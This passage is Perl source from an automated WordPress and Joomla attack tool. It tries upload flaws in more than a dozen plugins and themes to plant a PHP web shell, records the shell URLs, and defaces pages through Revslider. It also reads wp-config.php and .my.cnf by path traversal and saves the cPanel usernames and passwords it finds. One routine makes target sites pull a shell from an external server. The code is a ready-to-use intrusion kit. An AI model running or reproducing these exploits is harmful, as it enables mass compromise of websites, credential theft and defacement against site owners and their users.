$cherryup="$site/wp-content/plugins/cherry-plugin/admin/import-export/XBazooka.php?X=Bazooka";

my $checkcherry = $ua->get("$cherryup")->content;
if($checkcherry =~/X Bazooka/) {
print color('bold white'),"[Cherry Plugin]";
print color('bold white')," ...................... ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cherryup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$cherryup\n";
close (TEXT);
}else{
print color('bold white'),"[Cherry Plugin]";
print color('bold white')," ...................... ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";
}
}

################ Download Manager #####################
sub downloadsmanager(){
$downloadsmanagervuln="$site/wp-content/plugins/downloads-manager/readme.txt";
my $url = "$site";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [upfile => ["XBazooka.php"], dm_upload => '',]);
$dmup="$site/wp-content/plugins/downloads-manager/upload/XBazooka.php?X=Bazooka";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/X Bazooka/) {
print color('bold white'),"[Download Manager]";
print color('bold white')," ................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $dmup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$dmup\n";
close (TEXT);
}else{
print color('bold white'),"[Download Manager]";
print color('bold white')," ................... ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";
}
}

################ Formcraft #####################
sub formcraft(){
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $shell ="XBazooka.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$formcraftup="$site/wp-content/plugins/formcraft/file-upload/server/php/files/XBazooka.php?X=Bazooka";

if ($response->content =~ /{"files/) {
print color('bold white'),"[Formcraft]";
print color('bold white')," .......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $formcraftup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$formcraftup\n";
close (TEXT);
}else{
print color('bold white'),"[Formcraft]";
print color('bold white')," .......................... ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";
}
}

################ Power Zoomer #####################
sub powerzoomer(){ 
my $url = "$site/wp-admin/admin.php?page=powerzoomer_manage";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["XBazooka.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/powerzoomer\/(.*?)\/big\/XBazooka.php/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/uploads/powerzoomer/$uploadfolder/big/XBazooka.php?X=Bazooka";
print color('bold white'),"[Power Zoomer]";
print color('bold white')," ....................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold white'),"[Power Zoomer]";
print color('bold white')," ....................... ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";
}
}
################ Simple Ads Manager #####################
sub ads(){  
my $url = "$site/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";

my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["XBazooka.php"], action => 'upload_ad_image', path => '',]);
$adsup="$site/wp-content/plugins/simple-ads-manager/XBazooka.php?X=Bazooka";
if ($adsres->content =~ /{"status":"success"}/) {
print color('bold white'),"[Simple Ads Manager]";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $adsup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$adsup\n";
close (TEXT);
}else{
print color('bold white'),"[Simple Ads Manager]";
print color('bold white')," ................. ";
print color('bold red'),"[Failed]\n";
}
}

################ Slide Show Pro #####################
sub slideshowpro(){ 
my $url = "$site/wp-admin/admin.php?page=slideshowpro_manage";

my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["XBazooka.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);

if ($slideshowres->content =~ /\/uploads\/slideshowpro\/(.*?)\/big\/XBazooka.php/) {
$uploadfolder=$1;
$sspup="$site/wp-content/uploads/slideshowpro/$uploadfolder/big/XBazooka.php?X=Bazooka";

print color('bold white'),"[Slide Show Pro]";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $sspup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$sspup\n";
close (TEXT);
}else{
print color('bold white'),"[Slide Show Pro]";
print color('bold white')," ..................... ";
print color('bold red'),"[Failed]\n";
}
}

################################## WP Mobile Detector ########################################
##############################################################################################
# check the link of the shell or you can upload "wpmobiledetectorshell.zip" on you one shell #
##############################################################################################
sub wpmobiledetector(){ 
$wpmdshell = "https://www.uniodontojf.com.br/XBazooka.php";
$url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
$wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/XBazooka.php?X=Bazooka";

my $check = $ua->get("$url"); 

my $checkup = $ua->get("$wpmdup")->content; 
if($checkup =~/X Bazooka/) {
print color('bold white'),"[WP Mobile Detector]";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wpmdup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$wpmdup\n";
close (TEXT);
}else{
print color('bold white'),"[WP Mobile Detector]";
print color('bold white')," ................. ";
print color('bold red'),"[Failed]\n";
}
}
################ InBoundio Marketing #####################
sub inboundiomarketing(){ 
my $url = "$site/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php";
$inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/XBazooka.php?X=Bazooka";
my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["XBazooka.php"],]);

$checkinbomarketing = $ua->get("$inbomarketingup")->content;
if($checkinbomarketing =~/X Bazooka/) {


print color('bold white'),"[InBoundio Marketing]";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $inbomarketingup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$inbomarketingup\n";
close (TEXT);
}else{
print color('bold white'),"[InBoundio Marketing]";
print color('bold white')," ................ ";
print color('bold red'),"[Failed]\n";
}
}

################ dzs-zoomsounds #####################
sub dzszoomsounds(){ 
my $url = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload.php";
$dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/XBazooka.php?X=Bazooka";
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["XBazooka.php"],]);

$checkdzsup = $ua->get("$dzsup")->content;
if($checkdzsup =~/X Bazooka/) {

print color('bold white'),"[dzs-zoomsounds]";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $dzsup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$dzsup\n";
close (TEXT);
}else{
print color('bold white'),"[dzs-zoomsounds]";
print color('bold white')," ..................... ";
print color('bold red'),"[Failed]\n";
}
}

################ reflex-gallery #####################/
sub reflexgallery(){ 
my $url = "$site/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=$year&Month=$month";
$reflexup = "$site/wp-content/uploads/$year/$month/XBazooka.php?X=Bazooka";
my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["XBazooka.php"],]);

$checkreflexup = $ua->get("$reflexup")->content;
if($checkreflexup =~/X Bazooka/) {
print color('bold white'),"[Reflex Gallery]";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $reflexup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$reflexup\n";
close (TEXT);
}else{
print color('bold white'),"[Reflex Gallery]";
print color('bold white')," ..................... ";
print color('bold red'),"[Failed]\n";
}
}


################ Creative Contact Form #####################
sub sexycontactform(){ 
my $url = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php";
$sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/XBazooka.php?X=Bazooka";
my $field_name = "files[]";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["XBazooka.php"] ]
           
            );

$checksexycontactup = $ua->get("$sexycontactup")->content;
if($checksexycontactup =~/X Bazooka/) {
print color('bold white'),"[Creative Contact Form]";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $sexycontactup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$sexycontactup\n";
close (TEXT);
}else{
print color('bold white'),"[Creative Contact Form]";
print color('bold white')," .............. ";
print color('bold red'),"[Failed]\n";
}
}

################ Work The Flow File Upload #####################
sub wtffu(){
my $url = "$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/";
my $shell ="XBazooka.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wtffup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/XBazooka.php?X=Bazooka";

$checkwtffup = $ua->get("$wtffup")->content;
if($checkwtffup =~/X Bazooka/) {
print color('bold white'),"[Work The Flow File Upload]";
print color('bold white')," .......... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wtffup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$wtffup\n";
close (TEXT);
}else{
print color('bold white'),"[Work The Flow File Upload]";
print color('bold white')," .......... ";
print color('bold red'),"[Failed]\n";
}
}


################  PHP Event Calendar #####################
sub phpeventcalendar(){
my $url = "$site/wp-content/plugins/php-event-calendar/server/file-uploader/";
my $shell ="XBazooka.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$phpevup="$site/wp-content/plugins/php-event-calendar/server/file-uploader/XBazooka.php?X=Bazooka";

if ($response->content =~ /{"files/) {
print color('bold white'),"[PHP Event Calendar]";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $phpevup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$phpevup\n";
close (TEXT);
}else{
print color('bold white'),"[PHP Event Calendar]";
print color('bold white')," ................. ";
print color('bold red'),"[Failed]\n";
}
}

################ Revslider upload shell #####################
sub revslider(){

my $url = "$site/wp-admin/admin-ajax.php";

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $revslidres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["XBazooka.zip"]]);

my $revs = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/XBazooka.php")->content;
my $revavada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php")->content;
my $revstriking = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php")->content;
my $revincredible = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php")->content;
my $revultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/XBazooka.php")->content;
my $revmedicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/XBazooka.php")->content;
my $revcentum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/XBazooka.php")->content;
my $revbeachapollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/XBazooka.php")->content;
my $revcuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php")->content;
my $revpindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/XBazooka.php")->content;
my $revdesignplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php")->content;
my $revrarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php")->content;
my $revandre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php")->content;

if($revs =~ /X Bazooka/){
print color('bold white'),"[Revslider]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$site/wp-content/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
close (TEXT);
}

elsif($revavada =~ /X Bazooka/){
print color('bold white'),"[Revslider]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
close (TEXT);
}


elsif($revstriking =~ /X Bazooka/){
print color('bold white'),"[Revslider]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
close (TEXT);
}

elsif($revincredible =~ /X Bazooka/){
print color('bold white'),"[Revslider]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
close (TEXT);
}

elsif($revmedicate =~ /X Bazooka/){
print color('bold white'),"[Revslider]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$site$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
close (TEXT);
}

elsif($revultimatum =~ /X Bazooka/){
print color('bold white'),"[Revslider]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
close (TEXT);
}

elsif($revcentum =~ /X Bazooka/){
print color('bold white'),"[Revslider]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/centum/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
close (TEXT);
}

elsif($revbeachapollo =~ /X Bazooka/){
print color('bold white'),"[Revslider]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
close (TEXT);
}

elsif($revcuckootap =~ /X Bazooka/){
print color('bold white'),"[Revslider]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
close (TEXT);
}

elsif($revpindol =~ /X Bazooka/){
print color('bold white'),"[Revslider]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
close (TEXT);
}

elsif($revdesignplus =~ /X Bazooka/){
print color('bold white'),"[Revslider]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
close (TEXT);
}

elsif($revrarebird =~ /X Bazooka/){
print color('bold white'),"[Revslider]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
close (TEXT);
}

elsif($revandre =~ /X Bazooka/){
print color('bold white'),"[Revslider]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/XBazooka.php?X=Bazooka\n";
close (TEXT);
}

else{
print color('bold white'),"[Revslider Upload Shell]";
print color('bold white')," ............. ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";
revsliderajax();
}
}
################ Revslider ajax #####################
sub revsliderajax(){

my $url = "$site/wp-admin/admin-ajax.php";

my $revslidajaxres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_captions_css", data => "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>HaCKeD BY Wissem Mahfoud<b>"]);

$revsliderajax = $site . '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

my $checkrevsajax = $ua->get("$revsliderajax")->content;
if($checkrevsajax =~ /HaCKeD/){
print color('bold white'),"[Revslider Deface Ajax]";
print color('bold white')," .............. ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold white'),"Defaced Successfully\n";
print color('bold white'),"  [Link] => $revsliderajax\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$revsliderajax\n";
close (TEXT);
}else{
print color('bold white'),"[Revslider Deface Ajax]";
print color('bold white')," .............. ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";
}
}

sub getconfig{
$url = "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold white'),"[Revslider Get Config]";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
     open(save, '>>Result/Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
    getcpconfig();
}else{
print color('bold white'),"[Revslider Get Config]";
print color('bold white')," .............. ";
print color('bold red'),"[Failed]\n";
}
}

sub getcpconfig{
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
print color('bold white'),"[Revslider Get cPanel]";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";

$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

print color('bold white'),"URL : $site/cpanel\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"USER : $1\n";
open (TEXT, '>>Result/cPanel.txt');
print TEXT "Url : $site\n";
print TEXT "USER : $1\n";
close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
            print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"PASS : $1\n";
open (TEXT, '>>Result/cPanel.txt');
print TEXT "PASS : $1\n";
close (TEXT);
        }


}
}else{
print color('bold white'),"[Revslider Get cPanel]";
print color('bold white')," .............. ";
print color('bold red'),"[failed]\n";
}
}

################ Synoptic #####################
sub synoptic(){
my $url = "$site/wp-content/themes/synoptic/lib/avatarupload/upload.php";
my $shell ="XBazooka.php";
my $field_name = "qqfile";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$Synopticup="$site/wp-content/uploads/markets/avatars/XBazooka.php?X=Bazooka";

$checkSynopticup = $ua->get("$Synopticup")->content;
if($checkSynopticup =~/X Bazooka/) {
print color('bold white'),"[Synoptic]";
print color('bold white')," ........................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $Synopticup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$Synopticup\n";
close (TEXT);
}else{
print color('bold white'),"[Synoptic]";
print color('bold white')," ........................... ";
print color('bold red'),"[Failed]\n";
}
}

################ Wpshop #####################
sub Wpshop(){
my $url = "$site/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload";
my $shell ="XBazooka.php";
my $field_name = "wpshop_file";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wpshopup="$site/wp-content/uploads/XBazooka.php?X=Bazooka";

$checkwpshopup = $ua->get("$wpshopup")->content;
if($checkwpshopup =~/X Bazooka/) {

print color('bold white'),"[Wp Shop]";
print color('bold white')," ............................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wpshopup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$wpshopup\n";
close (TEXT);
}else{
print color('bold white'),"[Wp Shop]";
print color('bold white')," ............................ ";
print color('bold red'),"[Failed]\n";
}
}

################ foxcontact #####################
sub foxcontact(){

@foxvuln= ("components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_func.php",
"components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php");
OUTER: foreach $foxvuln(@foxvuln){
chomp $foxvuln;

my $url = "$site/$foxvuln";

my $shell ="XBazooka.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$foxup="$site/components/com_foxcontact/_func.php?X=Bazooka";
}
my $checkfoxup = $ua->get("$foxup")->content;
if ($checkfoxup =~ /X Bazooka/) {
print color('bold white'),"[Com Foxcontact]";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $foxup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$foxup\n";
close (TEXT);
}else{
print color('bold white'),"[Com Foxcontact]";
print color('bold white')," ..................... ";
print color('bold red'),"[Failed]\n";
}
}
################ comweblinks #####################
sub comweblinks(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );
$urlone ="$site/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author=";
$token = $ua->get($urlone)->content;
if($token =~/<form action="(.*?)" id="uploadForm"/)
{
$url=$1;
}

my $index ="m.gif";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$weblinksup= "$site/images/m.gif";
$check = $ua->get($weblinksup)->status_line;
if ($check =~ /200/){
print color('bold white'),"[Com Weblinks]";
print color('bold white')," ....................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Link] => $weblinksup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$weblinksup\n";
